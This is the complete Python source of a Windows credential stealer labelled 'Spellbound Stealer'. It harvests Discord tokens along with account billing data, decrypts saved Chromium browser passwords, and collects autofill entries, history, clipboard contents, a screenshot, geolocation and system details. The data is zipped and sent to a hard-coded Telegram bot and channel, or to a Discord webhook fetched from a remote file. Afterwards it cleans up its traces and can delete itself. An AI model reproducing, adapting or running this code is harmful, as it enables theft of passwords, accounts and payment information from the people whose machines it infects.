CONFIG = {
    "C2": "telegram",
    "discord": True,
    "chromium": True,
    "system-infos": True,
    "screenshot": True,
    "file-stealer": False,
    "clipboard": True,
    "installed-softwares": True,
    "installed-browsers": True,
    "auto-delete": False
}

import os
import re
import sys
import time
import json
import uuid
import winreg
import ctypes
import base64
import shutil
import socket
import base64
import sqlite3
import zipfile
import platform
import subprocess
import ctypes.wintypes

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= SYSTEM =============================================================================================================== #
PYTHON_CMD = sys.executable

LOCALAPPDATA = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')

USER_PATH = f"C:\\Users\\{os.getlogin()}"

CONTAINER_FOLDER_PATH = f"C:\\Users\\{os.getlogin()}\\My Games"
ZIP_PATH = f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()}.zip"
DISCORD_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Discord"
CHROMIUM_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Chromium Browsers"
FILES_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Common Files"
SOFTWARE_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Softwares"

if not os.path.exists(CONTAINER_FOLDER_PATH):
    os.mkdir(CONTAINER_FOLDER_PATH)
if not os.path.exists(DISCORD_FOLDER_PATH):
    os.mkdir(DISCORD_FOLDER_PATH)
if not os.path.exists(CHROMIUM_FOLDER_PATH):
    os.mkdir(CHROMIUM_FOLDER_PATH)
if not os.path.exists(FILES_FOLDER_PATH):
    os.mkdir(FILES_FOLDER_PATH)
if not os.path.exists(SOFTWARE_FOLDER_PATH):
    os.mkdir(SOFTWARE_FOLDER_PATH)
with open(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", "w") as writer:
    pass

FILE_HEADER = """
┌───────────────────────────┐
│   GRABBED BY SPELLBOUND   │
└───────────────────────────┘
\n\n
"""


class log:
    def error(text):
        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [ERROR] {text}")
        with open(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", "a") as writer:
            writer.write(f"[{time.strftime("%H:%M:%S", time.localtime())}] [ERROR] {text}\n")
    def info(text):
        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [INFO] {text}")
        with open(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", "a") as writer:
            writer.write(f"[{time.strftime("%H:%M:%S", time.localtime())}] [INFO] {text}\n")

def InstallPackages(packages):
    for package in packages:
        log.info(f"Installing package {package}")
        try:
            subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            subprocess.run(["pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

InstallPackages(packages=["requests", "pycryptodome", "pyperclip", "pillow"])
import requests
import pyperclip

from PIL import Image
from Crypto.Cipher import AES

def KillProcess(processName):
    result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    if processName not in result.stdout:
        return

    subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    log.info(f"{processName} has been terminated")

def SafeRemove(path):
    try:
        if os.path.exists(path):
            os.remove(path)
            log.info(f"{path} has been deleted")
    except Exception as e:
        log.error(f"{path} cannot be deleted : {e}")

def ListFileInDir(directory, maxDepth=1):
    finalFiles = []
    currentDepth = 0

    if currentDepth > maxDepth:
        return finalFiles

    for root, dirs, files in os.walk(directory):
        for file in files:
            finalFiles.append(os.path.join(root, file))

        if currentDepth + 1 > maxDepth:
            dirs.clear()

    return finalFiles

def AddFolderToZip(zipFile, folderPath, arcBase=""):
    for root, dirs, files in os.walk(folderPath):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, start=folderPath)
            if arcBase:
                arcname = os.path.join(arcBase, arcname)
            zipFile.write(file_path, arcname)

def GetFolderSize(path):
    total_size = 0
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            if os.path.exists(fp):
                total_size += os.path.getsize(fp)
    return total_size

def AutoDelete():
    subprocess.Popen(["cmd.exe", "/C", "ping", "localhost", "-n", "5", "&&", "del", "/F", f"\"{__file__}\""])
    sys.exit()

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= DISCORD ============================================================================================================== #
discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
__DISCORD_TOKENS__ = []
__USER_EMAILS__ = []
discordUIDS = []
discordCommonPaths = {'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\','Discord Canary': ROAMING + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': ROAMING + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': ROAMING + '\\discordptb\\Local Storage\\leveldb\\','Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': LOCALAPPDATA + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': LOCALAPPDATA + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': LOCALAPPDATA + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': LOCALAPPDATA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': LOCALAPPDATA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': LOCALAPPDATA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': LOCALAPPDATA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
totalDiscordTokens = 0

def ValidateToken(token: str) -> bool:
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    if r.status_code == 200: 
        return True
    return False

def DecryptVal(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass
    
def GetMasterKey(path: str) -> str:
    if not os.path.exists(path):
        return None
    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return None

    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()

    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
        decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
        ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
        return decrypted_key

def ExtractInfosFromToken():
    if not __DISCORD_TOKENS__:
        return

    final_to_return = []
    for token in __DISCORD_TOKENS__:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()

        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']

        if user['premium_type'] == 0:
            nitro = 'None'
        elif user['premium_type'] == 1:
            nitro = 'Nitro Classic'
        elif user['premium_type'] == 2:
            nitro = 'Nitro'
        elif user['premium_type'] == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'

        if billing:
            payment_methods = []
            for method in billing:
                if method['type'] == 1:
                    payment_methods.append('Credit Card')
                elif method['type'] == 2:
                    payment_methods.append('PayPal')
                else:
                    payment_methods.append('Unknown')
            payment_methods = ', '.join(payment_methods)
        else:
            payment_methods = None

        final_message = (f'Username: {username} ({user_id})\n'
                         f'Token: {token}\n'
                         f'Nitro: {nitro}\n'
                         f'Billing: {payment_methods if payment_methods != "" else "None"}\n'
                         f'MFA: {mfa}'
                         f'Email: {email if email != None else "None"}\n'
                         f'Phone: {phone if phone != None else "None"}\n'
                         f'==============\n')
        final_to_return.append(final_message)

        if email != None:
            __USER_EMAILS__.append(email)

    return final_to_return

def DiscordGetTokens():
    for name, path in discordCommonPaths.items():
        if not os.path.exists(path): continue
        _discord = name.replace(" ", "").lower()
        if "cord" in path:
            if not os.path.exists(ROAMING + f'\{_discord}\Local State'): continue
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(discordRegexpEnc, line):
                        token = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(ROAMING + f'\{_discord}\Local State'))

                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                __DISCORD_TOKENS__.append(token)
                                discordUIDS.append(uid)

        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(discordRegexp, line):
                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                __DISCORD_TOKENS__.append(token)
                                discordUIDS.append(uid)


if CONFIG["discord"]:
    try:
        DiscordGetTokens()
        
        tokens = ExtractInfosFromToken()
        with open(f"{DISCORD_FOLDER_PATH}\\.tokens.txt", "w", encoding="utf-8") as writer:
            writer.write(FILE_HEADER)
            for token in tokens:
                writer.write(token)
                totalDiscordTokens += 1

        log.info(f"Discord Token saved")
    except Exception as e:
        log.error(f"Unexpected error - Discord : {e}")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= CHROMIUM ============================================================================================================= #
__CHROMIUM_PASSWORDS__ = []
__CHROMIUM_AUTOFILLS__ = []
__CHROMIUM_HISTORY__ = []
chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(ROAMING, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(ROAMING, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]
totalPasswords = 0
totalAutofills = 0
totalHistory = 0

def ChromiumDecryptData(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn),
                None,
                None,
                None,
                None,
                0,
                ctypes.byref(pDataOut)
            ):
                decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                return decrypted_data.decode()

        except Exception as e:
            log.error("Function encountered an error : {e}")
            return f"Failed to decrypt data: {e}"
        
def ChromiumGetPassword():
    for browser in chromiumBrowsers:
        KillProcess(browser['taskname'])
        local_state_path = os.path.join(browser['path'], 'Local State')
        if not os.path.exists(local_state_path):
            continue

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        try:
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(key), ctypes.cast(key, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)
            ):
                decryption_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            else:
                raise ValueError("Failed to decrypt master key.")
        except Exception as e:
            log.error(f"Error decrypting master key: {e}")
            continue

        for subpath in chromiumSubpaths:
            login_data_path = os.path.join(browser['path'], subpath['path'], 'Login Data')
            if not os.path.exists(login_data_path):
                continue

            try:
                temp_db = os.path.join(browser['path'], subpath['path'], f"{browser['name']}-pw.db")
                shutil.copy(login_data_path, temp_db)

                connection = sqlite3.connect(temp_db)
                cursor = connection.cursor()
                query_passwords = "SELECT origin_url, username_value, password_value FROM logins"
                cursor.execute(query_passwords)

                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    password = ChromiumDecryptData(encrypted_password, decryption_key)

                    if username or password:
                        __CHROMIUM_PASSWORDS__.append(
                            {
                                "browser": browser["name"],
                                "profile": subpath["name"],
                                "url": origin_url,
                                "username": username,
                                "password": password,
                            }
                        )

                cursor.close()
                connection.close()
                os.remove(temp_db)

            except Exception as e:
                log.error(f"Error reading passwords for {browser['name']} - {subpath['name']}: {e}")
                continue

def ChromiumGetAutofill():
    for browser in chromiumBrowsers:
        KillProcess(browser["name"])
        browser_path = browser["path"]
        if not os.path.exists(browser_path):
            continue

        for profile in chromiumSubpaths:
            profile_path = os.path.join(browser_path, profile["path"])
            web_data_path = os.path.join(profile_path, "Web Data")

            if os.path.exists(web_data_path):
                temp_copy = web_data_path + "_temp"
                shutil.copy2(web_data_path, temp_copy)

                try:
                    conn = sqlite3.connect(temp_copy)
                    cursor = conn.cursor()

                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                    tables = [table[0] for table in cursor.fetchall()]
                    if "autofill" in tables:
                        cursor.execute("SELECT name, value FROM autofill")
                        autofills = cursor.fetchall()

                        for autofill in autofills:
                            autofill_entry = (
                                f'Name: {autofill[0]}\n'
                                f'Value: {autofill[1]}\n'
                                f"Browser: {browser['name']}\n"
                                '==============\n'
                            )
                            __CHROMIUM_AUTOFILLS__.append(autofill_entry)

                    conn.close()
                except sqlite3.Error as e:
                    pass
                finally:
                    os.remove(temp_copy)

def ChromiumGetHistory():
    for browser in chromiumBrowsers:
        KillProcess(browser["name"])
        history_path = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/History"
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
        rows = cursor.fetchall()
        conn.close()
        for row in rows:
            history_entry = f"Url: {row[0]}\nTitle: {row[1]}\n==============\n"
            __CHROMIUM_HISTORY__.append(history_entry)

if CONFIG["chromium"]:
    try:
        ChromiumGetPassword()

        formatted = ""
        for entry in __CHROMIUM_PASSWORDS__:
            formatted += (
                f"URL:            {entry['url']}\n"
                f"Username:       {entry['username']}\n"
                f"Password:       {entry['password']}\n"
                f"==============\n")
            totalPasswords += 1

            with open(f"{CHROMIUM_FOLDER_PATH}\\.passwords.txt", "w", encoding="utf-8") as writer:
                writer.write(FILE_HEADER)
                writer.write(formatted)

        log.info(f"Passwords saved")
    except Exception as e:
        log.error(f"Unexpected error - Chromium - Passwords : {e}")

    try:
        ChromiumGetAutofill()

        with open(f"{CHROMIUM_FOLDER_PATH}\\.autofills.txt", "w", encoding="utf-8") as writer:
            writer.write(FILE_HEADER)
            for autofill in __CHROMIUM_AUTOFILLS__:
                writer.write(autofill)
                totalAutofills += 1

        log.info(f"Autofills saved")
    except Exception as e:
        log.error(f"Unexpected error - Chromium - Autofills : {e}")

    try:
        ChromiumGetHistory()

        with open(f"{CHROMIUM_FOLDER_PATH}\\.history.txt", "w", encoding="utf-8") as writer:
            writer.write(FILE_HEADER)
            for entry in __CHROMIUM_HISTORY__:
                writer.write(entry)
                totalHistory += 1

        log.info(f"History saved")
    except Exception as e:
        log.error(f"Unexpected error - Chromium - History : {e}")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= CLIPBOARD ============================================================================================================== #
if CONFIG["clipboard"]:
    try:
        if pyperclip.paste() != "":
            with open(f"{CONTAINER_FOLDER_PATH}\\.clipboard.txt", "w", encoding="utf-8") as writer:
                writer.write(FILE_HEADER)
                writer.write(subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors="ignore").strip())
            
            log.info(f"Clipboard saved")
    except Exception as e:
        log.error(f"Unexpected error - Clipboard : {e}")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= FILES ================================================================================================================ #
fileStealerPaths = [f"{USER_PATH}/Desktop", f"{USER_PATH}/Documents", f"{USER_PATH}/Downloads"]
fileStealerExtensions = [".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".odt", ".ods", ".bat", ".py", ".db", ".csv"]
fileStealerName = ["passeport", "certificat", "identite", "diplome", "rib", "cv", "motivation", "medical", "passe", "password", "credential", "login", "chrome", "firefox", "token", "client"]
fileMaxSize = 4194304
filesToSteal = []
totalFiles = 0

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [("biSize", ctypes.wintypes.DWORD),("biWidth", ctypes.wintypes.LONG),("biHeight", ctypes.wintypes.LONG),("biPlanes", ctypes.wintypes.WORD),("biBitCount", ctypes.wintypes.WORD),("biCompression", ctypes.wintypes.DWORD),("biSizeImage", ctypes.wintypes.DWORD),("biXPelsPerMeter", ctypes.wintypes.LONG),("biYPelsPerMeter", ctypes.wintypes.LONG),("biClrUsed", ctypes.wintypes.DWORD),("biClrImportant", ctypes.wintypes.DWORD),]

if CONFIG["screenshot"]:
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc_screen = user32.GetDC(0)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbm = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
        gdi32.SelectObject(hdc_mem, hbm)
        gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
        bmp_info = BITMAPINFOHEADER()
        bmp_info.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmp_info.biWidth = screen_width
        bmp_info.biHeight = -screen_height
        bmp_info.biPlanes = 1
        bmp_info.biBitCount = 32
        bmp_info.biCompression = 0
        buffer_size = screen_width * screen_height * 4
        buffer = ctypes.create_string_buffer(buffer_size)
        gdi32.GetDIBits(hdc_screen, hbm, 0, screen_height, buffer, ctypes.byref(bmp_info), 0)
        gdi32.DeleteObject(hbm)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)
        image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
        image.save(f"{CONTAINER_FOLDER_PATH}\\.desktop.png")
        log.info(f"Screenshot saved")
        totalFiles += 1
    except Exception as e:
        log.error(f"The screenshot encountered an error : {e}")

if CONFIG["file-stealer"]:
    for path in fileStealerPaths:
        files = ListFileInDir(path)
        
        for file in files:
            if os.path.getsize(file) < fileMaxSize:
                file_name = os.path.basename(file)

                if any(file_name.endswith(ext) for ext in fileStealerExtensions) or any(name in file_name for name in fileStealerName):
                    filesToSteal.append(file)

    for file in filesToSteal:
        destination = f"{FILES_FOLDER_PATH}\\{os.path.basename(file)}"
        shutil.copy(file, destination)
        log.info(f"{file} added to the zip")
        totalFiles += 1


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= USER PC ============================================================================================================== #
requInfos = requests.get('https://ipinfo.io')
data = requInfos.json()

session = os.getlogin()
computer_name = socket.gethostname()
os_version = platform.system() + " " + platform.release()
architecture = platform.machine()
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
ip = data.get('ip')
country = data.get('country')
region = data.get('region')
city = data.get('city')
loc = data.get('loc')
org = data.get('org')
cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().split('\n')[2]

if CONFIG["system-infos"]:
    with open(f"{CONTAINER_FOLDER_PATH}\\.computer.txt", "w", encoding="utf-8") as writer:
        writer.write(FILE_HEADER)

        writer.write(f"""👤 Session Name: {session}
👥 Computer Name: {computer_name}
💻 OS: {os_version}
🛠 Architecture: {architecture}
📡 MAC: {mac}
⚙ CPU: {cpu}
📌 IP: {ip}
🌍 Country: {country}
🗺 Region: {region}
🏠 City: {city}
🧭 Localisation: {loc}
⚡ Internet Provider: {org}
""")

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= INSTALLED SOFTWARES ================================================================================================== #
if CONFIG["installed-browsers"]:
    with open(f"{SOFTWARE_FOLDER_PATH}\\.installed-browsers.txt", "w", encoding="utf-8") as writer:
        writer.write(FILE_HEADER)

        writer.write("=== Installed Browsers ===\n")
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    writer.write(f"{winreg.EnumKey(key, i)}\n")
        except FileNotFoundError:
            pass

if CONFIG["installed-softwares"]:
    with open(f"{SOFTWARE_FOLDER_PATH}\\.installed-softwares.txt", "w", encoding="utf-8") as writer:
        writer.write(FILE_HEADER)

        key_paths = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]

        writer.write("=== Installed Softwares ===\n")

        for key_path in key_paths:
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        subkey_name = winreg.EnumKey(key, i)
                        try:
                            with winreg.OpenKey(key, subkey_name) as subkey:
                                name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                writer.write(f"{name}\n")
                        except FileNotFoundError:
                            continue
            except FileNotFoundError:
                    continue

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= BUILD ZIP ============================================================================================================ #
with zipfile.ZipFile(ZIP_PATH, "w") as zip_file:
    zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", arcname=".execution logs.txt")
    if CONFIG["screenshot"]: zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.desktop.png", arcname=".desktop.png")
    if CONFIG["discord"]: AddFolderToZip(zip_file, DISCORD_FOLDER_PATH, arcBase="Discord")
    if CONFIG["chromium"]: AddFolderToZip(zip_file, CHROMIUM_FOLDER_PATH, arcBase="Chromium Browsers")
    if CONFIG["file-stealer"]: AddFolderToZip(zip_file, FILES_FOLDER_PATH, arcBase="Common Files")
    if CONFIG["installed-browsers"] or CONFIG["installed-softwares"]: AddFolderToZip(zip_file, SOFTWARE_FOLDER_PATH, arcBase="Softwares")
    if CONFIG["clipboard"]: zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.clipboard.txt", arcname=".clipboard.txt")
    if CONFIG["system-infos"]: zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.computer.txt", arcname=".computer.txt")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= SEND DATA ============================================================================================================ #
if CONFIG["C2"] == "discord":
    blue = "[2;45m[0m[2;45m[0m[2;35m"
    purple = "[2;34m"
    reset = "[0m"

    embed = {
        "title": "Spellbound Stealer",
        "color": 0,
        "fields": [
            {"name": ":computer: __System Infos__", "value": f"```ansi\n{blue}Session Name{reset} : {session}\n{blue}Computer Name{reset} : {computer_name}\n{blue}OS{reset} : {os_version}\n{blue}Architecture{reset} : {architecture}\n{blue}MAC{reset} : {mac}\n{blue}CPU{reset} : {cpu}\n{blue}IP{reset} : {ip}\n{blue}Country{reset} : {country}\n{blue}Region{reset} : {region}\n{blue}City{reset} : {city}\n{blue}Localisation{reset} : {loc}\n{blue}Internet Provider{reset} : {org}```", "inline": False},
            {"name": ":identification_card: __Available Infos__", "value": f"```ansi\n{purple}Discord Account{reset} : {totalDiscordTokens}\n{purple}Passwords{reset} : {totalPasswords}\n{purple}Auto-fills{reset} : {totalAutofills}\n{purple}History{reset} : {totalHistory}\n{purple}Stolen Files{reset} : {totalFiles}```", "inline": False},
        ],
        "footer": {"text": "Grabbed by Spellbound"}
    }
    payload = {"embeds": [embed]}

    with open(ZIP_PATH, "rb") as zipFileToSend:
        fileReady = {"file": zipFileToSend}
        try:
            req = requests.get("https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/main/snake.txt")
            log.info("Webhook extracted")
            res = requests.post(req.text.strip(), files=fileReady, data={"payload_json": json.dumps(payload)})
            log.info("Data succesfully sent")
        except Exception as e:
            log.error(f"Webhook error : {e}")

elif CONFIG["C2"] == "telegram":
    TOKEN = "7931282619:AAEW3bNWCj3Pjj6n-SHew1fSgryTtjtBRr4"
    CHANNEL_ID = "-1002458809139"

    MESSAGE = f"""
<u><b>System Infos :</b></u>
    👤 Session Name: {session}
    👥 Computer Name: {computer_name}
    💻 OS: {os_version}
    🛠 Architecture: {architecture}
    📡 MAC: {mac}
    📌 IP: {ip}
    🌍 Country: {country}

<u><b>Available Infos :</b></u>
    🔵 Discord Account: {totalDiscordTokens}
    ⌨ Passwords: {totalPasswords}
    📑 Auto-fills: {totalAutofills}
    🗂 History: {totalHistory}
    🗃 Stolen Files: {totalFiles}"""

    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(ZIP_PATH, "rb") as file:
        files = {"document": file}
        data = {"chat_id": CHANNEL_ID, "caption": MESSAGE, "parse_mode": "HTML"}
        res = requests.post(url, data=data, files=files)

SafeRemove(ZIP_PATH)
SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.desktop.png")
SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.clipboard.txt")
SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.computer.txt")
shutil.rmtree(DISCORD_FOLDER_PATH)
shutil.rmtree(SOFTWARE_FOLDER_PATH)
shutil.rmtree(CHROMIUM_FOLDER_PATH)
shutil.rmtree(FILES_FOLDER_PATH)
SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt")

if CONFIG["auto-delete"]:
    if not "Spellbound" in __file__ or not "Developements" in __file__:
        AutoDelete()
